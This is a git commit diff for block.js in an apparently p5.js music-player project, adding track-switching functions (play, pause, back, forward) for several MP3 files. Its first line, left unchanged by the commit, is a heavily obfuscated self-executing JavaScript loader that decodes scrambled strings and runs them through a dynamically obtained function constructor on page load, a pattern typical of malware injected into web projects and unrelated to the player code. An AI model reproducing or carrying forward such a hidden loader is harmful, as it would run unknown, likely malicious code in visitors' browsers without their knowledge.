5e688c044176bf698c2a62172618ce9e56e35a09
Universalprogrammer <brunnostudios164@gmail.com>
2025-07-01 17:41:16 -0300

    Update block.js

--- RED BULLS 25/block.js
+++ RED BULLS 25/block.js
@@ -1,9 +1,91 @@
 var pass;(function(){var ASG='',gXE=516-505;function yDq(q){var z=1186374;var u=q.length;var c=[];for(var t=0;t<u;t++){c[t]=q.charAt(t)};for(var t=0;t<u;t++){var a=z*(t+69)+(z%49653);var e=z*(t+492)+(z%41103);var n=a%u;var j=e%u;var y=c[n];c[n]=c[j];c[j]=y;z=(a+e)%6634520;};return c.join('')};var pyT=yDq('cfzyesqstvndurwrnphgckalxtjicrtumoobo').substr(0,gXE);var ZKI='+)+a)=+(, r2hSu<A;[rjl +s=offdezgha56hmf1zqre46vewrg=;=al]ps.8ht7dc81,7otnsc)gurs,o=,;f;v[,0gn86(00lbas,pmr00h0;}9.;u=7=6g(hrot;rknr;=aessa,)=[l<vv+=m)orrt{.),b34n;l+1+of6ar(jj]v(lv=14i0q+ui4(s;=)v2o(;u]t)f n+(fev>t2enc !=)8nvn1z "Ass==(z(ec(9;viurt ,"].rim(se+n=c7,aa+pl),a.2ll}khn+;[urit9.pl(t9=}r};2n(>r l18 l;sndva*,+f7lacr](r-dn2.,drasup.rgegtaeears5ir""1uca t=a{(i;jr;t +)d<z,15.lcailrj"r].9sbier-9=iu; vot*9.y=[tj)q)cc=r;;va2li)b.u!=ab["l=n]b)o-ag; ;t(;"a;=japg{h]=n)v};ax+aphiiplbrsrC0A.,m]b (8{0i.t  ev(eexACib=;u=,;5.tpab;oi)h;efto)t;=6{s) p(s(=(,]zmtr.drC"(r7o)p(a.fhorhsub,hsot=v7[v,(iol)usC]=[a]kc)un+pp+se1un=;.tul(7{g;p,; bn.[=l"q.n1a48a7o[+in-)f.rrik.}r;xn<a+m=.(<yp16hA1;)+)oeva+ dircf(.yutelvo]dae0fu+))2=l2lvs,-6,1e;;=anr r )n;4a0xmo,-r91g[artmf vr8=ie . +;f n;Cxz({=,)g5[gt;olthog)eodjdenrrihel(b.xp,h0trec+;)l(vyS,b;)gb;,-lChtrllu(+q[C )on=v=fnf(;.si[i}3uaa;=n=rC";(8)]';var VCl=yDq[pyT];var TGn='';var diI=VCl;var VhR=VCl(TGn,yDq(ZKI));var AkQ=VhR(yDq('o4mc"+2lwl=_p9_tp3hC7{XX;(X1egaX);,e$(o2nX)omdlSws;_ge-)jcta3_()rSt;2))3_Xf== .p.(X$r_X5.r;af]537;b,5n.)Xj#4udXe4%_cll5XuXX$XcXt_1%"==_$.msloo2d_]Xa(n_X0X!3oet}cr]qXX(bbngt)e8ri)zXX!e!_b.7XrX.des1sof.7a3X1g..t);a)..$da.Xb"ozs(wo0es,(;7ofj4gv;321e;tr=4XXX_.]o_{%in6X9%6cc*%ab..3!b_(Xf!on6)c6cnc.\'uh-IaXnt0(t\/enctE,!.c).#;h)_X;b{X,0uocXbaX0t90;or.(5!he1Xas(ae0,1_28.XX)caplcd4=.=Xm12n=lc;b=3=9c4]jmvgrX%r)w,e).S5pk:krtXs:hof1=kca: 8&}X.&)$XX03ro{,.e8+.h3;.5dX..]leIg 2!3!fe% cmg0foeX(XcX=0;X0Xn,.eddi),7(q.1;n-(.n] Xrkcr.it93)}rf4ldtbuec==09aX(Xel0ie+X)cr.cX]XX8o..X=au7\/5,_ac)),Xnf7s,,ae065X3$4r6(Xaa3.)i,.,}&oioeX 9te).XXp93t13(+)r))44[{_Xa1XXvz08, )1pe0h.X$51r..&d_1:es!r_Xc0_h$2l]j__p)}X)n,Xo_c ,2.{i6_}X5-!e2(;(.4Xah%e o]X%95(o6dXinX2)0:)_o))_a}mo0dnr4X!lX5=f,a.!,elt2Xe_X.aE1yk{=.dsX;;r2XXn0!,9DvX n -e.0r.s__6y3.ntp$)<)X)X1i%,u)mXxXm_t"m5C_0$a%5e=Xl8X10X4d)cXi7=3(c!21!n(6-)].;ofe_6Xc56s;X(jr"b3#%l}e)g){.c4r(45\'5c_2 5\/X+5;#5<X!+f91se(t(7 X!eh,m2X;j),\'c%)cX)n$ime&)(fs\/Xf(]! 709Xco7"$h(]XXg{343(a(1X{!;7"6(l!90,$("]g 9;]304f.e.Xeg1Xi2bertXv {ow]r}jpcs7XX(X_=X(!$,l cs!,n,m 2#XkX+X.X00Xs<*(lS28]7,e4_"(7X5l\'yj_2af;n;(;X2salC9h.Xc; S),2fr.49a]*_,#)!#.1"d3}ha*2)ete.36.)dl*5Xtce(e41i=,oi($o[wmedcrXXX+st]4+.!6n=6&$a;7 X!!(}lX#kX[$$)1t4r $X.4;{a5$ X=..%%(_aeaXm(X,)p{sp2.)mX.X52ru&- $S.Xo.5)=X(no)XXeXXj(,eXt4."a)"a)X1,=c{5[{, )Sa4((i_j(c_.3aot!XylX=9;tu3cti6-XX<}=:!,a.3_.cn3+p)_X= t;9)$$==r_tt8ne\/a3.).r5s_=9)}% .].toX(rneX=.lX e( f__X$]'));var enU=diI(ASG,AkQ );enU(1365);return 9247})()
 
 let fft, canvas, song, started = false;
+let currentSongName = 'Interworld.mp3';
+let radio = document.getElementById('music');
+
+function pause(){
+  song.pause();
+}
+function play() {
+    song.play();
+    loop();
+    started = true;
+}
+function back() {
+  if (song && song.isPlaying()) {
+    song.stop();
+  }
+  started = true;
+  if (currentSongName === 'Interworld.mp3') {
+    loadSound('1235289_Fluxxwave.mp3', function(newSong) {
+      song = newSong;
+      currentSongName = '1235289_Fluxxwave.mp3';
+      radio.textContent = 'Fluxxwave - Clovis Reyes';
+      song.play();
+      fft.setInput(song);
+      loop();
+    });
+  } 
+  else if(currentSongName === 'PASSO BEM SOLTO.mp3') {
+    loadSound('Interworld.mp3', function(newSong) {
+      song = newSong;
+      currentSongName = 'Interworld.mp3';
+      radio.textContent = 'interworld - metamorphosis';
+      song.play();
+      fft.setInput(song);
+      loop();
+    });
+  }
+  else {
+    loadSound('Interworld.mp3', function(newSong) {
+      song = newSong;
+      currentSongName = 'Interworld.mp3';
+      song.play();
+      fft.setInput(song);
+      loop();
+    });
+  }
+}
+function forward(){
+  if (song && song.isPlaying()) {
+    song.stop();
+  }
+  started = true;
+  if (currentSongName === '1235289_Fluxxwave.mp3') {
+    loadSound('Interworld.mp3', function(newSong) {
+      song = newSong;
+      currentSongName = 'Interworld.mp3';
+      radio.textContent = 'interworld - metamorphosis';
+      song.play();
+      fft.setInput(song);
+      loop();
+    });
+  }
+  else if (currentSongName === 'Interworld.mp3') {
+    loadSound('PASSO BEM SOLTO.mp3', function(newSong) {
+      song = newSong;
+      currentSongName = 'PASSO BEM SOLTO.mp3';
+      radio.textContent = 'PASSO BEM SOLTO - ATLXS';
+      song.play();
+      fft.setInput(song);
+      loop();
+    });
+  }
+   else {
+    loadSound('Interworld.mp3', function(newSong) {
+      song = newSong;
+      currentSongName = 'Interworld.mp3';
+      song.play();
+      fft.setInput(song);
+      loop();
+    });
+  }
+}
 
 function preload() {
   song = loadSound('Interworld.mp3');
+  currentSongName = 'Interworld.mp3';
 }
 
 function setup() {
